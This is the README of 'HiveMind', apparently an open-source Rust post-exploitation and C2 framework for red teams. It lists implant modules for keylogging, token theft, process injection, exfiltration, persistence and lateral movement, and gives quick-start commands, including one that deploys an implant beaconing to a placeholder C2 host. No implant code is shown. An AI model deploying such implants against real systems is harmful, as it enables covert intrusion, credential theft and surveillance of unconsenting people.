<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,100:6C63FF&height=280&section=header&text=HiveMind&fontSize=75&fontAlignY=32&animation=twinkling&fontColor=ffffff" alt="header"/>
</p>

<p align="center">
  <a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=700&size=22&pause=1000&color=6C63FF&center=true&vCenter=true&width=600&lines=Rust+Post-Exploitation+Framework;Encrypted+Beaconing+%26+Modular+Payloads;Cross-Platform+Implant+Engine;Red+Team+%E2%9C%93+Stealth+%E2%9C%93+Performance+%E2%9C%93" alt="Typing SVG"/></a>
</p>

<br>

<p align="center">
  <img src="https://img.shields.io/badge/rust-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white" alt="Rust"/>
  <img src="https://img.shields.io/badge/version-1.0.0-6C63FF?style=for-the-badge&logo=git&logoColor=white" alt="Version"/>
  <img src="https://img.shields.io/badge/license-MIT-6C63FF?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License"/>
  <img src="https://img.shields.io/badge/platform-cross--platform-0d1117?style=for-the-badge&logo=windows&logoColor=white&link=https://github.com/Ruby570bocadito/HiveMind" alt="Platform"/>
  <img src="https://img.shields.io/badge/PRs-welcome-6C63FF?style=for-the-badge&logo=github&logoColor=white" alt="PRs Welcome"/>
  <img src="https://img.shields.io/badge/maintenance-actively--developed-0d1117?style=for-the-badge&logo=clockify&logoColor=white" alt="Maintenance"/>
</p>

<br>

---

# 🧠 HiveMind

> **A modular, encrypted, post-exploitation framework written in Rust.**  
> Designed for red teams who demand stealth, performance, and reliability under pressure.

HiveMind is a **cross-platform implant engine** with **encrypted beaconing**, **modular payload architecture**, and **real-time C2 communication**. Every component is built with Rust's zero-cost abstractions, memory safety guarantees, and minimal footprint — making it the ideal choice for modern adversarial simulations.

---

## 📡 Architecture

```mermaid
flowchart TB
    subgraph Operator["🕹️ Operator Console"]
        CLI["CLI / TUI Interface"]
        DASH["Real-Time Dashboard"]
    end

    subgraph C2["☁️ C2 Server"]
        SRV["HTTP/HTTPS Listener"]
        CRYPTO["🔐 Encryption Engine<br/>ChaCha20Poly1305 + X25519"]
        DB[(PostgreSQL / SQLite)]
        QUEUE["Message Queue"]
    end

    subgraph Implants["🧬 Implants"]
        B0["Beacon Type A<br/>HTTP(s) Sleep 0.5-60s"]
        B1["Beacon Type B<br/>DNS-over-HTTPS"]
        B2["Beacon Type C<br/>WebSocket Persistent"]
        MODS["⚙️ Module System"]
    end

    subgraph Modules["📦 Module Pool"]
        M1["Shell Execution"]
        M2["File Exfiltration"]
        M3["Process Injection"]
        M4["Token Manipulation"]
        M5["Keylogging"]
        M6["Lateral Movement"]
        M7["Persistence"]
        M8["🔌 Loadable Plugin"]
    end

    Operator <-->|"TLS 1.3"| C2
    C2 <-->|"Encrypted Beacons"| Implants
    MODS <--> Modules
    Implants --> MODS

    style Operator fill:#1a1a2e,stroke:#6C63FF,stroke-width:2px,color:#fff
    style C2 fill:#16213e,stroke:#6C63FF,stroke-width:2px,color:#fff
    style Implants fill:#0f3460,stroke:#6C63FF,stroke-width:2px,color:#fff
    style Modules fill:#1a1a2e,stroke:#e94560,stroke-width:2px,color:#fff

    style CLI fill:#2d2d44,stroke:#6C63FF,color:#fff
    style DASH fill:#2d2d44,stroke:#6C63FF,color:#fff
    style SRV fill:#2d2d44,stroke:#6C63FF,color:#fff
    style CRYPTO fill:#2d2d44,stroke:#6C63FF,color:#fff
    style DB fill:#2d2d44,stroke:#6C63FF,color:#fff
    style QUEUE fill:#2d2d44,stroke:#6C63FF,color:#fff
    style B0 fill:#2d2d44,stroke:#6C63FF,color:#fff
    style B1 fill:#2d2d44,stroke:#6C63FF,color:#fff
    style B2 fill:#2d2d44,stroke:#6C63FF,color:#fff
    style MODS fill:#2d2d44,stroke:#6C63FF,color:#fff
    style M1 fill:#2d2d44,stroke:#e94560,color:#fff
    style M2 fill:#2d2d44,stroke:#e94560,color:#fff
    style M3 fill:#2d2d44,stroke:#e94560,color:#fff
    style M4 fill:#2d2d44,stroke:#e94560,color:#fff
    style M5 fill:#2d2d44,stroke:#e94560,color:#fff
    style M6 fill:#2d2d44,stroke:#e94560,color:#fff
    style M7 fill:#2d2d44,stroke:#e94560,color:#fff
    style M8 fill:#2d2d44,stroke:#e94560,color:#fff
```

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔒 **End-to-End Encryption** | ChaCha20-Poly1305 + X25519 key exchange — all C2 traffic encrypted |
| 🧩 **Modular Payload System** | Hot-loadable modules at runtime; extend without recompiling |
| ⚡ **Performance** | Built with Rust — minimal CPU/memory footprint, maximum speed |
| 🕵️ **Stealth** | Configurable jitter, sleep intervals, beacon types, and traffic shaping |
| 🖥️ **Cross-Platform** | Windows, Linux, macOS — single codebase, native performance |
| 🧠 **Multi-Beacon** | HTTP/s, DNS-over-HTTPS, WebSocket — adapt to any network egress |
| 📊 **Dashboard** | Real-time implant monitoring, tasking, and intelligence gathering |

---

## 🚀 Quick Start

```bash
# Clone the repository
git clone https://github.com/Ruby570bocadito/HiveMind.git
cd HiveMind

# Build the C2 server
cargo build --release -p hive-c2

# Build the implant
cargo build --release -p hive-implant

# Start the server
./target/release/hive-c2 --config config/server.toml

# Deploy the implant
./target/release/hive-implant --server https://c2.example.com:8443
```

### 📋 Prerequisites

- **Rust** 1.70+ (install via [rustup](https://rustup.rs/))
- **OpenSSL** development headers
- **PostgreSQL** (recommended) or SQLite

---

## 📦 Module Reference

| Module | Type | Description |
|--------|------|-------------|
| `shell` | Execution | Run arbitrary shell commands on target |
| `exec-assembly` | Execution | Execute .NET assemblies in-memory (Windows) |
| `download` | Exfiltration | Exfiltrate files from target |
| `upload` | Injection | Upload files to target |
| `screenshot` | Collection | Capture desktop screenshots |
| `keylog` | Collection | Capture keystrokes (Windows) |
| `inject` | Injection | Shellcode/PE injection into remote processes |
| `token-steal` | Privilege | Steal access tokens for impersonation |
| `persist-svc` | Persistence | Register as Windows service |
| `persist-cron` | Persistence | Create cron job / launchd plist |
| `lateral-wmi` | Lateral | WMI-based lateral movement (Windows) |
| `lateral-ssh` | Lateral | SSH key-based lateral movement (Linux/macOS) |
| `socks5` | Pivot | SOCKS5 proxy through implant |
| `portfwd` | Pivot | TCP port forwarding |
| `enum-host` | Recon | Enumerate host processes, services, users |
| `enum-net` | Recon | Network neighborhood / Active Directory enumeration |
| `plugin` | 🔌 Custom | Load arbitrary compiled `.so`/`.dll` plugin |

---

## 🔧 Configuration

```toml
# config/server.toml
[server]
bind = "0.0.0.0:8443"
tls_cert = "certs/server.crt"
tls_key = "certs/server.key"
database = "postgres://hive:hive@localhost:5432/hivemind"

[crypto]
kex = "X25519"
cipher = "ChaCha20-Poly1305"

[beacon]
default_interval = 10        # seconds
jitter = 0.3                  # 30% jitter
user_agent = "Mozilla/5.0 ..."
kill_date = "2026-12-31"
```

---

## 🧪 Testing

```bash
# Run all tests
cargo test --workspace

# Run with logging
RUST_LOG=debug cargo test

# Integration tests
cargo test --test integration
```

---

## 🤝 Contributing

We welcome contributions from the red team community. Check our [issues](https://github.com/Ruby570bocadito/HiveMind/issues) for open tasks.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-module`)
3. Commit your changes (`git commit -m 'Add amazing module'`)
4. Push to the branch (`git push origin feature/amazing-module`)
5. Open a Pull Request

---

## ⚠️ Disclaimer

> HiveMind is intended **exclusively for authorized security assessments, penetration testing, and red team exercises**.  
> The authors assume **no liability** for misuse or damage caused by this software.  
> **You are responsible for complying with all applicable laws.**

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:6C63FF,100:0d1117&height=150&section=footer&text=HiveMind+%E2%80%94+Red+Team+%E2%9C%93&fontSize=24&fontAlignY=65&fontColor=ffffff" alt="footer"/>
</p>

<p align="center">
  <a href="https://github.com/Ruby570bocadito/HiveMind"><img src="https://img.shields.io/badge/GitHub-HiveMind-6C63FF?style=for-the-badge&logo=github" alt="GitHub"/></a>
  <a href="https://github.com/Ruby570bocadito/HiveMind/issues"><img src="https://img.shields.io/badge/Report%20Bug-0d1117?style=for-the-badge&logo=github" alt="Report Bug"/></a>
  <a href="https://github.com/Ruby570bocadito/HiveMind/discussions"><img src="https://img.shields.io/badge/Join%20Discussion-6C63FF?style=for-the-badge&logo=github" alt="Discussions"/></a>
</p>

<p align="center">
  <sub>Built with ❤️ and 🦀 by the HiveMind team</sub>
  <br>
  <sub>© 2026 Ruby570bocadito. MIT License.</sub>
</p>
